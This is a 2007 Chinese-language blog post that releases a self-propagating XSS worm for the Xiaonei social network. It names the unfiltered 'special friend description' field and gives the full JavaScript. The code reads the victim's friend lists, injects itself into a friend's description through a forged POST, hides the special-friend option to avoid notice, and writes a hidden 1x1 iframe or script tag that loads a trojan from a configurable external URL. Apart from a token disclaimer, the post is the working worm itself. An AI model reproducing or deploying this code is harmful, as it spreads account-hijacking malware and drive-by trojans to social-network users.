---
title: 最新校内xss漏洞加利用worm
description: from:恶魔傻蛋网络研究中心呵呵....发现留这个东西实在没什么用处,就在这个群里首发吧.~~呵呵.希望能有对我们ncu的网络安全事业有点促进作用~~呵呵.大家别去干坏事哦~~~呵呵,自我感觉这个worm写的还不错.嘿嘿.~大家学习参考之用,危害极大,如有人用于非法用途,概不负责.存在漏洞页面:特别好友的描述那里,没有做任何过滤~
date: 2007-12-24 12:12:26
category: 技术文章
tags: ['跨站', 'Worm', '漏洞信息']
post_id: 304
alias: XiaoNei-XSS-Worm
ViewNums: 3889
---

from:恶魔傻蛋网络研究中心
呵呵....发现留这个东西实在没什么用处,就在这个群里首发吧.~~呵呵.希望能有对我们ncu的网络安全事业有点促进作用~~呵呵.

大家别去干坏事哦~~~

呵呵,自我感觉这个worm写的还不错.嘿嘿.~

大家学习参考之用,危害极大,如有人用于非法用途,概不负责.

存在漏洞页面:特别好友的描述那里,没有做任何过滤~

=============================================================

以下是worm代码

=============================================================
```javascript
var url = ""; //本段代码的地址如:[http://www.emodd.com/other/1.txt](http://www.emodd.com/other/1.txt "http://www.emodd.com/other/1.txt")
var maurl = ""; //木马的URL,和下面的maiframe参数和用
var tezheng = ""; //上面url参数的特征部分,如emodd
var maiframe = true; //判断挂马的方式(true为iframe,false为script,详情请见代码末尾ma()函数)

var req;
var s; //获取的页面源代码
var code = '<script src="'+url+'" langueage="javascript"></script>'; //感染的代码

//下面为判断xmlhttp支持.这个是抄的以前那个校内蠕虫的,嘿嘿~
function checkxml(){
if(!req)
{
if(window.XMLHttpRequest)
{
try
{
req = new XMLHttpRequest();
} catch(e) { req = false;}
}
else if(window.ActiveXObject)
{
try
{
req = new ActiveXObject('Msxml2.XMLHTTP');
}
catch(e)
{
try
{
req = new ActiveXObject('Microsoft.XMLHTTP');
} catch(e) { req = false;}
}
}
}
if(req)
{
try
{
gets();
}catch(e)
{
req=false;
}
}
else{ma();}
}
//下面为获取特别好友页面源代码,并由此判断好友的ID和特别好友描述
function gets(){
req.open("GET", "[http://xiaonei.com/myhotfriendlist.do](http://xiaonei.com/myhotfriendlist.do "http://xiaonei.com/myhotfriendlist.do")", false);
req.send();
var s = req.responseText; //获取页面源文件
if(s.indexOf("hf_name",0)==-1) //判断是否有特别好友,没有则到addhf()添加
{
addhf();
}
else {
if(s.indexOf(tezheng,0)==-1){ //判断是否感染,感染就写马,未感染就感染
var descall1 = s.substring(s.indexOf("showhotfrienddesc.do")-58,s.indexOf("showhotfrienddesc.do")-26);
var descall = escape(descall1);
var descen = descall.substring(descall.indexOf("%09%09%09"),descall.indexOf("%3Ca"));
var desc =unescape(descen); //上面四行为获取特别好友的描述内容
var hfid = s.substring(s.indexOf("hf_name")-10,s.indexOf("hf_name")-1);//获取第一个特别好友的校内数字id
inject(hfid,desc);
}else{ma();}
}
}
//下面函数添加好友
function addhf(){
req.open("GET", "[http://xiaonei.com/myfriendlist.do](http://xiaonei.com/myfriendlist.do "http://xiaonei.com/myfriendlist.do")", false);
req.send();
var ss = req.responseText; //获取好友页面源代码
var fdid = ss.substring(ss.indexOf("portal=search&id=")+17,ss.indexOf("portal=search&id=")+26);//获取第一个好友id
req.open("GET","[http://xiaonei.com/addhotfriend.do?id=](http://xiaonei.com/addhotfriend.do?id= "http://xiaonei.com/addhotfriend.do?id=")"+fdid+"&from=mf&curpage=0", false);
req.send();
var desc = '<script langueage="javascript">document.getElementById("userFriendSpecial").style.display ="none";</script>';//隐藏个人页面的特别好友选项,隐蔽作用
inject(fdid,desc);
}
//下面函数为感染
function inject(hfid,desc){
var postinfo = "contents="+escape(desc)+escape(code)+"%20&guestId="+hfid+"&submit=%E7%A1%AE%E8%AE%A4";
req.open("POST","/saveMyHFDesc.do",false);
req.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
req.send(postinfo);
ma();
}
//下面函数为挂马
function ma(){
if(maurl!=""){ //判断挂马地址是否为空,为空则不写
if(maiframe){
document.write('<iframe src="'+maurl+'" width=1 height=1 frameborder=0></iframe>')
}
document.write('<script src="'+maurl+'" langueage="javascript"></script>');
}
}
//开始
checkxml();
```
============================================================

